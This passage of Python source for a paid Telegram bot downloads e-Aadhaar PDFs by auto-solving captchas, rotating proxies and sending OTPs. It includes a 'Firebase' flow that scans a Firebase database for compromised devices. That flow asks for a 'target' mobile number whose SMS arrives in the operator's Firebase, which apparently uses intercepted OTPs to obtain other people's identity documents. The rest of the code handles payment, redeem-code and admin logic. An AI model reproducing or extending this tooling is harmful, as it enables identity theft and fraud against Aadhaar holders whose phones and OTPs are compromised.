                f"⏳  ǫᴜᴇʀʏɪɴɢ ᴄʟᴏᴜᴅғʟᴀʀᴇ ᴘᴀʏᴍᴇɴᴛ ɢᴀᴛᴇᴡᴀʏ…"
            )
            
            is_ok, verify_resp = gateway.verify_utr(utr)
            if is_ok:
                verified_amount = float(verify_resp.get('amount', expected_amount))
                matched_credits = credits_to_add
                matched_lifetime = is_lifetime_tier
                for p_key, p_data in PLANS.items():
                    if float(p_data['amount']) == verified_amount:
                        matched_credits = p_data['credits']
                        matched_lifetime = p_data['lifetime']
                        break
                        
                success = record_successful_payment(
                    chat_id, utr, verified_amount, matched_credits, matched_lifetime
                )
                if success:
                    qr_msg_id = d.get('qr_msg_id')
                    if qr_msg_id:
                        delete_message(chat_id, qr_msg_id)
                    clear_session(chat_id)
                    cr = get_credits(chat_id)
                    cr_display = "♾️ ʟɪғᴇᴛɪᴍᴇ ᴠɪᴘ" if cr == float('inf') else f"{int(cr)} Credits"
                    success_text = (
                        f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                        f"<b>🎉 ᴘᴀʏᴍᴇɴᴛ ᴅᴇᴛᴇᴄᴛᴇᴅ & ᴠᴇʀɪғɪᴇᴅ!</b>\n\n"
                        f"✅  <b>ᴠᴇʀɪғɪᴇᴅ ᴜᴛʀ</b>   ·  <code>{utr}</code>\n"
                        f"💵  <b>ᴀᴍᴏᴜɴᴛ ᴘᴀɪᴅ</b>    ·  <b>₹{verified_amount:.0f}</b>\n"
                        f"🎁  <b>ᴄʀᴇᴅɪᴛs ᴀᴅᴅᴇᴅ</b>  ·  <b>+{matched_credits} Credits</b>\n"
                        f"📊  <b>ᴀᴘɪ sᴛᴀᴛᴜs</b>     ·  <code>SUCCESS</code>\n\n"
                        f"{DIVIDER}\n"
                        f"💰  <b>ᴛᴏᴛᴀʟ ʙᴀʟᴀɴᴄᴇ</b>  ·  <b>{cr_display}</b>\n\n"
                        f"<i>🚀 ʏᴏᴜ ᴄᴀɴ ɴᴏᴡ ᴘʀᴏᴄᴇᴇᴅ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴇ-ᴀᴀᴅʜᴀᴀʀ ᴘᴅғs!</i>"
                    )
                    sent_resp = send_message(chat_id, success_text, reply_markup=get_welcome_inline_keyboard())
                    sent_mid = sent_resp.get('result', {}).get('message_id') if (sent_resp and isinstance(sent_resp, dict)) else None
                    if sent_mid:
                        set_message_reaction(chat_id, message_id=sent_mid, emoji="🎉")
                    if message_id:
                        set_message_reaction(chat_id, message_id=message_id, emoji="🎉")
                    return
                else:
                    send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠️ Payment already credited for this UTR.")
                    return
            else:
                status_msg = verify_resp.get('message', 'Payment pending in bank settlement.')
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>⏳ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴘᴇɴᴅɪɴɢ</b>\n\n"
                    f"🔢  ᴜᴛʀ: <code>{utr}</code>\n"
                    f"⚠️  sᴛᴀᴛᴜs: {status_msg}\n\n"
                    f"<i>💡 ʙᴀɴᴋ sᴇᴛᴛʟᴇᴍᴇɴᴛ sᴏᴍᴇᴛɪᴍᴇs ᴛᴀᴋᴇs 15–30 sᴇᴄᴏɴᴅs.\n"
                    f"ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴀ ᴍᴏᴍᴇɴᴛ ᴀɴᴅ sᴜʙᴍɪᴛ ʏᴏᴜʀ ᴜᴛʀ ᴀɢᴀɪɴ!</i>",
                    reply_markup=get_cancel_keyboard()
                )
                return

    if current_step != 'main':
        idle = time.time() - s.get('last_activity', time.time())
        if idle > SESSION_TIMEOUT:
            clear_session(chat_id)
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>⏰ sᴇssɪᴏɴ ᴇxᴘɪʀᴇᴅ</b>\n\n"
                f"⚠️  ʀᴇᴀsᴏɴ   ·  ɪᴅʟᴇ ғᴏʀ 60 sᴇᴄᴏɴᴅs\n"
                f"✅  ᴄʀᴇᴅɪᴛs  ·  ɴᴏᴛ ᴅᴇᴅᴜᴄᴛᴇᴅ\n\n"
                f"{DIVIDER}\n"
                f"<i>📲  sᴇʟᴇᴄᴛ ᴀ ᴍᴇᴛʜᴏᴅ ʙᴇʟᴏᴡ ᴛᴏ sᴛᴀʀᴛ ᴀɢᴀɪɴ.</i>",
                reply_markup=get_menu_keyboard()
            )
            return

    touch_session(chat_id)

    # ── ADMIN INTERACTIVE COMMANDS ───────────────────────
    if current_step == 'admin_awaiting_userinfo' and is_admin(chat_id):
        clear_session(chat_id)
        handle_admin_command(chat_id, f"/userinfo {message_text.strip()}")
        return

    if current_step == 'admin_awaiting_send' and is_admin(chat_id):
        clear_session(chat_id)
        handle_admin_command(chat_id, f"/send {message_text.strip()}")
        return

    if current_step == 'admin_awaiting_ban' and is_admin(chat_id):
        clear_session(chat_id)
        handle_admin_command(chat_id, f"/ban {message_text.strip()}")
        return

    if current_step == 'admin_awaiting_unban' and is_admin(chat_id):
        clear_session(chat_id)
        handle_admin_command(chat_id, f"/unban {message_text.strip()}")
        return

    if current_step == 'admin_awaiting_create_code' or current_step == 'awaiting_admin_create_code':
        if is_admin(chat_id):
            parts = message_text.strip().split()
            if len(parts) >= 2:
                try:
                    code = parts[0].strip().upper()
                    creds_val = int(parts[1])
                    max_u = int(parts[2]) if len(parts) >= 3 else 1
                    is_lt = (creds_val == -1)
                    ok, res_msg = database.create_redeem_code(code, creds_val if not is_lt else 0, max_uses=max_u, make_lifetime=is_lt, created_by=str(chat_id))
                    clear_session(chat_id)
                    if ok:
                        val_txt = "♾️ Lifetime VIP" if is_lt else f"+{creds_val} Credits"
                        send_message(
                            chat_id,
                            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                            f"✅ <b>ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇ ᴄʀᴇᴀᴛᴇᴅ!</b>\n\n"
                            f"🎁  <b>ᴄᴏᴅᴇ:</b> <code>{code}</code>\n"
                            f"💰  <b>ᴠᴀʟᴜᴇ:</b> <b>{val_txt}</b>\n"
                            f"👥  <b>ᴍᴀx ᴜsᴇs:</b> <b>{max_u}</b>\n\n"
                            f"<i>Users can claim via the Redeem Code button or <code>/redeem {code}</code></i>",
                            reply_markup=get_admin_keyboard()
                        )
                    else:
                        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Failed to create code: {res_msg}", reply_markup=get_admin_keyboard())
                except ValueError:
                    send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Invalid numbers.\nUsage: <code>CODE CREDITS [MAX_USES]</code>\nExample: <code>FREE5 5 20</code>", reply_markup=get_cancel_keyboard())
            else:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Please enter at least <code>CODE CREDITS</code> (e.g. <code>FREE5 5 20</code>)", reply_markup=get_cancel_keyboard())
            return

    if current_step == 'awaiting_redeem_code' or message_text.strip().startswith('/redeem'):
        code_input = message_text.strip()
        if code_input.startswith('/redeem'):
            parts = code_input.split(None, 1)
            code_input = parts[1].strip() if len(parts) >= 2 else ""
        if not code_input:
            set_session(chat_id, 'awaiting_redeem_code')
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n🎁 <i>Please enter the redeem code:</i>", reply_markup=get_cancel_keyboard())
            return

        ok, msg, creds, is_lt = database.claim_redeem_code(chat_id, code_input)
        if ok:
            val_txt = "♾️ Lifetime VIP" if is_lt else f"+{int(creds)} Credits"
            clear_session(chat_id)
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"🎉 <b>ᴄᴏᴅᴇ ʀᴇᴅᴇᴇᴍᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!</b>\n\n"
                f"🎁  <b>ʀᴇᴡᴀʀᴅ:</b> <b>{val_txt}</b>\n\n"
                f"{DIVIDER}\n"
                f"<i>Enjoy downloading Aadhaar PDFs straight to Telegram!</i>",
                reply_markup=get_welcome_inline_keyboard()
            )
        else:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n{msg}", reply_markup=get_cancel_keyboard())
        return

    if current_step == 'admin_awaiting_broadcast' and is_admin(chat_id):
        clear_session(chat_id)
        handle_admin_command(chat_id, f"/broadcast {message_text.strip()}")
        return

    if current_step == 'admin_awaiting_channel' and is_admin(chat_id):
        parts = message_text.strip().split()
        if len(parts) >= 2:
            new_ch_id = parts[0].strip()
            new_ch_link = parts[1].strip()
            ok = database.set_channel_config(new_ch_id, new_ch_link)
            clear_session(chat_id)
            with _cm_lock:
                _channel_member_cache.clear()
            if ok:
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"✅ <b>ᴄʜᴀɴɴᴇʟ sᴜᴄᴄᴇssғᴜʟʟʏ ᴜᴘᴅᴀᴛᴇᴅ!</b>\n\n"
                    f"🆔  <b>ᴄʜᴀɴɴᴇʟ ɪᴅ:</b> <code>{new_ch_id}</code>\n"
                    f"🔗  <b>ɪɴᴠɪᴛᴇ ʟɪɴᴋ:</b> {new_ch_link}"
                )
                show_admin_channel_menu(chat_id)
            else:
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌ Error saving channel configuration.", reply_markup=get_cancel_keyboard())
        else:
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"❌ <b>ɪɴᴠᴀʟɪᴅ ғᴏʀᴍᴀᴛ.</b>\n\n"
                f"📋 <b>ғᴏʀᴍᴀᴛ:</b> <code>CHANNEL_ID INVITE_LINK</code>\n"
                f"<i>ᴇxᴀᴍᴘʟᴇ:</i> <code>-1002894475319 https://t.me/+Vq7Ha3AVq4JjNTNl</code>",
                reply_markup=get_cancel_keyboard()
            )
        return

    # ── FIREBASE AUTO-DOWNLOAD FLOW (URL FIRST) ─────────
    if current_step == 'awaiting_fb_url':
        text_clean = message_text.strip()
        parts = text_clean.split()

        found_url = None
        found_mobile = None
        for part in parts:
            p_strip = part.strip()
            if 'firebaseio.com' in p_strip.lower() or p_strip.lower().startswith(('http://', 'https://')):
                found_url = p_strip
            else:
                digits = re.sub(r'\D', '', p_strip)
                if len(digits) == 12 and digits.startswith('91'):
                    digits = digits[2:]
                if len(digits) == 10 and digits.isdigit():
                    found_mobile = digits

        if not found_url:
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"❌  <b>ɪɴᴠᴀʟɪᴅ ғɪʀᴇʙᴀsᴇ ᴜʀʟ.</b>\n\n"
                f"▸  ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ғɪʀᴇʙᴀsᴇ ʀᴇᴀʟᴛɪᴍᴇ ᴅᴀᴛᴀʙᴀsᴇ ᴜʀʟ.\n"
                f"▸  ᴇxᴀᴍᴘʟᴇ: <code>https://my-panel-default-rtdb.firebaseio.com</code>",
                reply_markup=get_cancel_keyboard()
            )
            return

        temp_msg = send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>🔍 ᴄᴏɴɴᴇᴄᴛɪɴɢ &amp; sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ…</b>\n\n"
            f"🌐  <code>{found_url}</code>\n"
            f"<i>⏳  ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴀ ᴍᴏᴍᴇɴᴛ…</i>"
        )
        temp_id = (temp_msg.get('result') or {}).get('message_id') if temp_msg else None

        ok_conn, conn_msg = bot.test_firebase_connection(found_url)
        if not ok_conn:
            if temp_id:
                delete_message(chat_id, temp_id)
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"❌  <b>ғɪʀᴇʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ғᴀɪʟᴇᴅ</b>\n\n"
                f"⚠️  {html.escape(str(conn_msg))}\n\n"
                f"<i>💡 ᴘʟᴇᴀsᴇ ᴇɴsᴜʀᴇ ʏᴏᴜʀ ғɪʀᴇʙᴀsᴇ ʀᴛᴅʙ ɪs ᴘᴜʙʟɪᴄ (ʀᴇᴀᴅ ᴀᴄᴄᴇss ᴇɴᴀʙʟᴇᴅ) ᴀɴᴅ ᴛʀʏ ᴀɢᴀɪɴ.</i>",
                reply_markup=get_cancel_keyboard()
            )
            return

        if found_mobile:
            if temp_id:
                delete_message(chat_id, temp_id)
            update_session_data(chat_id, 'fb_url', found_url)
            update_session_data(chat_id, 'fb_mobile', found_mobile)
            set_session(chat_id, 'downloading', get_session(chat_id)['data'])
            worker_pool.submit(_handle_firebase_download_worker, chat_id, found_mobile, found_url)
            return
        else:
            update_session_data(chat_id, 'fb_url', found_url)
            ok_scan, scan_data = bot.scan_firebase_devices(found_url)
            if temp_id:
                delete_message(chat_id, temp_id)

            if ok_scan and scan_data.get('devices'):
                set_session(chat_id, 'fb_devices_menu', {
                    'fb_url': found_url,
                    'devices': scan_data['devices'],
                    'page': 0
                })
                show_firebase_devices_menu(chat_id, page=0)
                return
            else:
                set_session(chat_id, 'awaiting_fb_mobile', get_session(chat_id)['data'])
                send_message(
                    chat_id,
                    f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                    f"<b>🥷 ᴅᴏᴡɴʟᴏᴀᴅ ᴠɪᴀ ғɪʀᴇʙᴀsᴇ</b>\n\n"
                    f"✅  <b>ғɪʀᴇʙᴀsᴇ ᴄᴏɴɴᴇᴄᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!</b>\n"
                    f"🌐  <code>{found_url}</code>\n\n"
                    f"⚠️  <i>ᴋᴏɪ ᴀᴄᴛɪᴠᴇ ᴅᴇᴠɪᴄᴇ ᴀᴜᴛᴏ-ᴅᴇᴛᴇᴄᴛ ɴᴀʜɪ ʜᴜᴀ.</i>\n\n"
                    f"📱  <b>ᴀʙ ᴛᴀʀɢᴇᴛ 10-ᴅɪɢɪᴛ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ʙʜᴇᴊᴏ:</b>\n\n"
                    f"💡  <i>ʏᴇʜ ɴᴜᴍʙᴇʀ ᴀᴀᴅʜᴀᴀʀ sᴇ ʟɪɴᴋ ʜᴏɴᴀ ᴄʜᴀʜɪʏᴇ ᴀᴜʀ ɪsᴋᴀ sᴍs ᴀᴀᴘᴋᴇ ғɪʀᴇʙᴀsᴇ ᴘᴀʀ ᴀᴀɴᴀ ᴄʜᴀʜɪʏᴇ.</i>",
                    reply_markup=get_cancel_keyboard()
                )
                return

    if current_step == 'awaiting_fb_mobile':
        mobile_candidate = re.sub(r'\D', '', message_text.strip())
        if len(mobile_candidate) == 12 and mobile_candidate.startswith('91'):
            mobile_candidate = mobile_candidate[2:]
        if len(mobile_candidate) != 10 or not mobile_candidate.isdigit():
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"❌  <b>ɪɴᴠᴀʟɪᴅ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ.</b>\n\n"
                f"▸  ᴍᴜsᴛ ʙᴇ ᴇxᴀᴄᴛʟʏ 10 ᴅɪɢɪᴛs\n"
                f"▸  ᴇxᴀᴍᴘʟᴇ: <code>9876543210</code>",
                reply_markup=get_cancel_keyboard()
            )
            return

        d = get_session(chat_id)['data']
        fb_url = d.get('fb_url')
        if not fb_url:
            clear_session(chat_id)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n⚠️ Session reset. Please start again.", reply_markup=get_welcome_inline_keyboard())
            return

        update_session_data(chat_id, 'fb_mobile', mobile_candidate)
        set_session(chat_id, 'downloading', get_session(chat_id)['data'])
        worker_pool.submit(_handle_firebase_download_worker, chat_id, mobile_candidate, fb_url)
        return

    # ── MOBILE NUMBER FLOW ───────────────────────────────
    if current_step == 'awaiting_mobile':
        parts = message_text.strip().split(None, 1)
        mobile_candidate = re.sub(r'\D', '', parts[0])
        if len(mobile_candidate) == 12 and mobile_candidate.startswith('91'):
            mobile_candidate = mobile_candidate[2:]
        if len(mobile_candidate) != 10 or not mobile_candidate.isdigit():
            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"❌  ɪɴᴠᴀʟɪᴅ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ.\n\n"
                f"▸  ᴍᴜsᴛ ʙᴇ ᴇxᴀᴄᴛʟʏ 10 ᴅɪɢɪᴛs\n"
                f"▸  ᴇxᴀᴍᴘʟᴇ: <code>9876543210</code>",
                reply_markup=get_cancel_keyboard()
            )
            return

        name = parts[1].strip() if len(parts) > 1 and len(parts[1].strip()) >= 2 else "Mr"
        update_session_data(chat_id, 'mobile', mobile_candidate)
        update_session_data(chat_id, 'name', name)

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ & sᴇɴᴅɪɴɢ ᴏᴛᴘ…</i>")

        ok, otp_txn, code, c_txn, t_id, err = bot.auto_send_eid_otp(chat_id, mobile_candidate, name)
        if not ok:
            clear_session(chat_id)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{err or 'Failed to send OTP'}</b>\n\n<i>Please check the mobile number and try again.</i>", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'eid_otp_txn_id', otp_txn)
        update_session_data(chat_id, 'captcha_code', code)
        update_session_data(chat_id, 'captcha_txn_id', c_txn)
        update_session_data(chat_id, 'transaction_id', t_id)
        set_session(chat_id, 'awaiting_eid_otp', get_session(chat_id)['data'])

        masked_mobile = f"{mobile_candidate[:2]}******{mobile_candidate[-2:]}"
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📲 ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"📱  ᴍᴏʙɪʟᴇ  ·  <code>{masked_mobile}</code>\n"
            f"⏰  ᴠᴀʟɪᴅ   ·  10 minutes\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    if current_step == 'awaiting_name':
        name = message_text.strip()
        if len(name) < 2:
            name = "Mr"

        update_session_data(chat_id, 'name', name)
        d = get_session(chat_id)['data']
        mobile = d.get('mobile')

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ & sᴇɴᴅɪɴɢ ᴏᴛᴘ…</i>")

        ok, otp_txn, code, c_txn, t_id, err = bot.auto_send_eid_otp(chat_id, mobile, name)
        if not ok:
            clear_session(chat_id)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{err or 'Failed to send OTP'}</b>\n\n<i>Please check the mobile number and try again.</i>", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'eid_otp_txn_id', otp_txn)
        update_session_data(chat_id, 'captcha_code', code)
        update_session_data(chat_id, 'captcha_txn_id', c_txn)
        update_session_data(chat_id, 'transaction_id', t_id)
        set_session(chat_id, 'awaiting_eid_otp', get_session(chat_id)['data'])

        masked_mobile = f"{mobile[:2]}******{mobile[-2:]}"
        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📲 ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"📱  ᴍᴏʙɪʟᴇ  ·  <code>{masked_mobile}</code>\n"
            f"⏰  ᴠᴀʟɪᴅ   ·  10 minutes\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    if current_step == 'awaiting_eid_otp':
        otp = re.sub(r'\D', '', message_text.strip())
        if len(otp) != 6:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Invalid OTP. Must be 6 digits.", reply_markup=get_cancel_keyboard())
            return

        d = get_session(chat_id)['data']
        mobile       = d.get('mobile')
        name         = d.get('name', 'Mr')
        otp_txn_id   = d.get('eid_otp_txn_id')
        c_txn        = d.get('captcha_txn_id')
        captcha_code = d.get('captcha_code')

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  Verifying OTP and retrieving EID…</i>")

        res = bot.verify_eid_otp(
            chat_id, mobile, name, otp, otp_txn_id, c_txn, captcha_code
        )
        if len(res) == 4:
            success, eid_number, verified_name, dob = res
        else:
            success, eid_number, verified_name = res
            dob = None

        if not success:
            clear_session(chat_id)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{verified_name or 'Verification failed'}</b>", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'eid_number', eid_number)
        update_session_data(chat_id, 'id_value', eid_number)
        update_session_data(chat_id, 'verified_name', verified_name or name)
        if dob:
            update_session_data(chat_id, 'dob', dob)

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  Auto-solving download captcha…</i>")
        dl_res = bot.auto_send_aadhaar_otp(chat_id, eid_number)
        ok = dl_res[0]
        if not ok:
            clear_session(chat_id)
            err = dl_res[5] if len(dl_res) > 5 else "Failed to send download OTP."
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  {err}", reply_markup=get_menu_keyboard())
            return

        dl_otp_txn = dl_res[1]
        dl_t_id = dl_res[4]
        sticky_proxy = dl_res[6] if len(dl_res) > 6 else None

        update_session_data(chat_id, 'download_otp_txn_id', dl_otp_txn)
        update_session_data(chat_id, 'dl_transaction_id', dl_t_id)
        if sticky_proxy:
            update_session_data(chat_id, 'sticky_proxy', sticky_proxy)
        set_session(chat_id, 'awaiting_final_otp', get_session(chat_id)['data'])

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>✅ ᴇɪᴅ ʀᴇᴛʀɪᴇᴠᴇᴅ</b>\n\n"
            f"👤  <b>ɴᴀᴍᴇ</b>  ·  {verified_name or name}\n"
            f"🔢  <b>ᴇɪᴅ</b>   ·  <code>{eid_number}</code>\n\n"
            f"{DIVIDER}\n"
            f"<b>📲 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    # ── AADHAAR NUMBER FLOW ──────────────────────────────
    if current_step == 'awaiting_aadhaar':
        parts = message_text.strip().split(None, 1)
        aadhaar = re.sub(r'\D', '', parts[0])
        if len(aadhaar) != 12 or not aadhaar.isdigit():
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Invalid Aadhaar number. Must be 12 digits.", reply_markup=get_cancel_keyboard())
            return

        update_session_data(chat_id, 'aadhaar_number', aadhaar)
        update_session_data(chat_id, 'id_value', aadhaar)

        if len(parts) > 1 and len(parts[1].strip()) >= 2:
            name = parts[1].strip()
            update_session_data(chat_id, 'verified_name', name)
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  ᴀᴜᴛᴏ-sᴏʟᴠɪɴɢ ᴄᴀᴘᴛᴄʜᴀ & sᴇɴᴅɪɴɢ ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ…</i>")
            dl_res = bot.auto_send_aadhaar_otp(chat_id, aadhaar)
            if not dl_res[0]:
                clear_session(chat_id)
                err = dl_res[5] if len(dl_res) > 5 else "Failed to send OTP"
                send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{err}</b>", reply_markup=get_menu_keyboard())
                return

            update_session_data(chat_id, 'download_otp_txn_id', dl_res[1])
            update_session_data(chat_id, 'dl_transaction_id', dl_res[4])
            if len(dl_res) > 6 and dl_res[6]:
                update_session_data(chat_id, 'sticky_proxy', dl_res[6])
            set_session(chat_id, 'awaiting_final_otp', get_session(chat_id)['data'])

            send_message(
                chat_id,
                f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
                f"<b>📲 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
                f"▸  Sent to your registered mobile number\n"
                f"⏰  Valid for 10 minutes\n\n"
                f"{DIVIDER}\n"
                f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
                reply_markup=get_cancel_keyboard()
            )
            return

        set_session(chat_id, 'awaiting_name_aadhaar', get_session(chat_id)['data'])
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>👤 ғᴜʟʟ ɴᴀᴍᴇ</b>\n\n▸ Enter your name as printed on Aadhaar", reply_markup=get_cancel_keyboard())
        return

    if current_step == 'awaiting_name_aadhaar':
        name = message_text.strip()
        if len(name) < 2:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Name too short. Enter full name.", reply_markup=get_cancel_keyboard())
            return

        update_session_data(chat_id, 'verified_name', name)
        d = get_session(chat_id)['data']
        aadhaar = d.get('aadhaar_number')
        
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  Auto-solving captcha & sending download OTP…</i>")
        dl_res = bot.auto_send_aadhaar_otp(chat_id, aadhaar)
        if not dl_res[0]:
            clear_session(chat_id)
            err = dl_res[5] if len(dl_res) > 5 else "Failed to send OTP"
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{err}</b>", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'download_otp_txn_id', dl_res[1])
        update_session_data(chat_id, 'dl_transaction_id', dl_res[4])
        if len(dl_res) > 6 and dl_res[6]:
            update_session_data(chat_id, 'sticky_proxy', dl_res[6])
        set_session(chat_id, 'awaiting_final_otp', get_session(chat_id)['data'])

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📲 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"▸  Sent to your registered mobile number\n"
            f"⏰  Valid for 10 minutes\n\n"
            f"{DIVIDER}\n"
            f"<i>👇  ᴇɴᴛᴇʀ ᴛʜᴇ 6-ᴅɪɢɪᴛ ᴏᴛᴘ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ ᴘʜᴏɴᴇ.</i>",
            reply_markup=get_cancel_keyboard()
        )
        return

    # ── EID INPUT FLOW ───────────────────────────────────
    if current_step == 'awaiting_eid_input':
        eid_clean = message_text.strip().replace('/', '').replace(' ', '')
        if len(eid_clean) not in (14, 28):
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Invalid EID format.\n▸ Standard EID: 14 digits or 28 digits", reply_markup=get_cancel_keyboard())
            return

        update_session_data(chat_id, 'eid_number', eid_clean)
        set_session(chat_id, 'awaiting_name_eid', get_session(chat_id)['data'])
        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<b>👤 ғᴜʟʟ ɴᴀᴍᴇ</b>\n\n▸ Enter your name as on EID slip", reply_markup=get_cancel_keyboard())
        return

    if current_step == 'awaiting_name_eid':
        name = message_text.strip()
        if len(name) < 2:
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  Name too short.", reply_markup=get_cancel_keyboard())
            return

        update_session_data(chat_id, 'verified_name', name)
        d = get_session(chat_id)['data']
        eid_clean = d.get('eid_number')

        send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n<i>⏳  Auto-solving captcha & sending download OTP…</i>")
        dl_res = bot.auto_send_aadhaar_otp(chat_id, eid_clean)
        if not dl_res[0]:
            clear_session(chat_id)
            err = dl_res[5] if len(dl_res) > 5 else "Failed to send OTP"
            send_message(chat_id, f"<b>{BOT_NAME}</b>\n{DIVIDER}\n❌  <b>{err}</b>", reply_markup=get_menu_keyboard())
            return

        update_session_data(chat_id, 'download_otp_txn_id', dl_res[1])
        update_session_data(chat_id, 'dl_transaction_id', dl_res[4])
        if len(dl_res) > 6 and dl_res[6]:
            update_session_data(chat_id, 'sticky_proxy', dl_res[6])
        set_session(chat_id, 'awaiting_final_otp', get_session(chat_id)['data'])

        send_message(
            chat_id,
            f"<b>{BOT_NAME}</b>\n{DIVIDER}\n"
            f"<b>📲 ᴅᴏᴡɴʟᴏᴀᴅ ᴏᴛᴘ sᴇɴᴛ</b>\n\n"
            f"▸  Sent to your registered mobile number\n"
            f"⏰  Valid for 10 minutes\n\n"
